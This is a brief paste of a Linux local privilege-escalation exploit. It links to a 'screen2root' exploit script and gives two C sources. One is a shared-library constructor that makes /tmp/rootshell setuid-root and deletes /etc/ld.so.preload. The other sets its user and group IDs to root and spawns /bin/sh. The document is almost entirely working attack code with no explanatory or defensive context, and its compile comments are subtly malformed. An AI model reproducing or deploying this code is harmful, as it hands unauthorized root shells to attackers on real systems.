    https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh

    LIBHAX.C #### gcc -fPIC -shared -ldl -o libhax.c

    #include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

    ROOTSHELL.C ##### gcc -fPIC -shared -ldl -o rootshell.c

    #include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
